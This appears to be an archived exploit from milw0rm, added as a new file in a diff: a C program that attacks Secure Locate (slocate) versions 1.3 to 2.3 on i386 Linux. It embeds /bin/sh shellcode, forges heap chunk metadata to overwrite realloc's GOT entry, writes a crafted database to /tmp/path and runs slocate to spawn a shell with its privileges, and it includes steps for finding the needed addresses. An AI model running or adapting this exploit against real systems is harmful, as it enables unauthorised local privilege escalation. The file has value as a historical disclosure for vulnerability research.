@@ -1,0 +1,148 @@
+/*
+ * MasterSecuritY <www.mastersecurity.fr>
+ *
+ * dislocate.c - Local i386 exploit in v1.3 < Secure Locate < v2.3
+ * Copyright (C) 2000  Michel "MaXX" Kaempf <maxx@mastersecurity.fr>
+ *
+ * Updated versions of this exploit and the corresponding advisory will
+ * be made available at:
+ *
+ * ftp://maxx.via.ecp.fr/dislocate/
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+#define PATH "/tmp/path"
+
+char *shellcode =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+void usage( char * string )
+{
+  fprintf( stderr, "* Usage: %s filename realloc malloc\n", string );
+  fprintf( stderr, "\n" );
+  fprintf( stderr, "* Example: %s /usr/bin/slocate 0x0804e7b0 0x08050878\n", string );
+  fprintf( stderr, "\n" );
+  fprintf( stderr, "* Realloc:\n" );
+  fprintf( stderr, "  $ objdump -R /usr/bin/slocate | grep realloc\n" );
+  fprintf( stderr, "\n" );
+  fprintf( stderr, "* Malloc:\n" );
+  fprintf( stderr, "  $ %s foobar 0x12121212 0x42424242\n", string );
+  fprintf( stderr, "  $ cp /usr/bin/slocate /tmp\n" );
+  fprintf( stderr, "  $ ltrace /tmp/slocate -d %s foobar 2>&1 | grep 'malloc(64)'\n", PATH );
+  fprintf( stderr, "  $ rm %s\n", PATH );
+  fprintf( stderr, "\n" );
+}
+
+int zero( unsigned int ui )
+{
+  if ( !(ui & 0xff000000) || !(ui & 0x00ff0000) || !(ui & 0x0000ff00) || !(ui & 0x000000ff) ) {
+    return( -1 );
+  }
+  return( 0 );
+}
+
+int main( int argc, char * argv[] )
+{
+  unsigned int ui_realloc;
+  unsigned int ui_malloc;
+  char path[1337];
+  char next[1337];
+  char * execve_argv[] = { NULL, "-d", PATH, next, NULL };
+  int fd;
+  unsigned int p_next;
+  unsigned int ui;
+
+  if ( argc != 4 ) {
+    usage( argv[0] );
+    return( -1 );
+  }
+  execve_argv[0] = argv[1];
+  ui_realloc = (unsigned int)strtoul( argv[2], NULL, 0 );
+  ui_malloc = (unsigned int)strtoul( argv[3], NULL, 0 );
+
+  strcpy( next, "ppppssssffffbbbb" );
+  p_next = (0xc0000000 - 4) - (strlen(execve_argv[0]) + 1) - (strlen(next) + 1);
+  for ( ui = 0; ui < p_next - (p_next & ~3); ui++ ) {
+    strcat( next, "X" );
+  }
+  p_next = (0xc0000000 - 4) - (strlen(execve_argv[0]) + 1) - (strlen(next) + 1);
+
+  ui = 0;
+  *((unsigned int *)(&(next[ui]))) = (unsigned int)(-1);
+
+  ui += 4;
+  *((unsigned int *)(&(next[ui]))) = ((ui_malloc - 8) + 136) - p_next;
+  if ( zero( *((unsigned int *)(&(next[ui]))) ) ) {
+    fprintf( stderr, "debug: next->size == 0x%08x;\n", *((unsigned int *)(&(next[ui]))) );
+    return( -1 );
+  }
+
+  ui += 4;
+  *((unsigned int *)(&(next[ui]))) = ui_realloc - 12;
+  if ( zero( *((unsigned int *)(&(next[ui]))) ) ) {
+    fprintf( stderr, "debug: next->fd == 0x%08x;\n", *((unsigned int *)(&(next[ui]))) );
+    return( -1 );
+  }
+
+  ui += 4;
+  *((unsigned int *)(&(next[ui]))) = ui_malloc;
+  if ( zero( *((unsigned int *)(&(next[ui]))) ) ) {
+    fprintf( stderr, "debug: next->bk == 0x%08x;\n", *((unsigned int *)(&(next[ui]))) );
+    return( -1 );
+  }
+
+  ui = 0;
+  path[ui] = (char)(256 - 4);
+
+  ui += 1;
+  *((unsigned int *)(&(path[ui]))) = p_next - (ui_malloc - 8);
+  if ( zero( *((unsigned int *)(&(path[ui]))) ) ) {
+    fprintf( stderr, "debug: oldp->size == 0x%08x;\n", *((unsigned int *)(&(path[ui]))) );
+    return( -1 );
+  }
+
+  ui += 4;
+  path[ui] = 0;
+  strcat( path, "\xeb\x0axxyyyyzzzz" );
+  strcat( path, shellcode );
+
+  fd = open( PATH, O_WRONLY|O_CREAT|O_EXCL, S_IRWXU );
+  if ( fd == -1 ) {
+    fprintf( stderr, "debug: open( \"%s\", O_WRONLY|O_CREAT|O_EXCL, S_IRWXU ) == -1;\n", PATH );
+    return( -1 );
+  }
+  write( fd, "0", sizeof("0") );
+  write( fd, "", sizeof("") );
+  write( fd, path, strlen(path) );
+  close( fd );
+
+  execve( execve_argv[0], execve_argv, NULL );
+  return( -1 );
+}
+
+
+// milw0rm.com [2000-12-02]
